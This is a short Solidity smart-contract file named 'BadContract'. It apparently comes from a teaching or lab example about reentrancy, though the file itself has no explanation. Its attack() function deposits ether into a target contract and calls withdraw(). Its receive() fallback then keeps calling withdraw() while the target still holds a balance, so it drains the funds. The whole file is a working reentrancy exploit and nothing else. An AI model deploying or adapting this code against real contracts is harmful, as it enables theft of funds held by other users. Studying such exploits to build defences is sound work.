//SPDX-License Identifier: MIT
pragma solidity ^0.8.4;

interface Vulnerable{
    function addBalance() external payable;
    function withdraw() external;
}

contract BadContract{

    Vulnerable public vulnerableContract;

    constructor(address _goodContractAddress) {
        vulnerableContract = Vulnerable(_goodContractAddress);
        
    }

    //Function to recieve ether
    receive() external payable{

        if(address(vulnerableContract).balance >0 ){
            vulnerableContract.withdraw();
        }

    }

    //Start attack
    function attack() public payable{
        vulnerableContract.addBalance{value:msg.value}();
        vulnerableContract.withdraw();
    }











}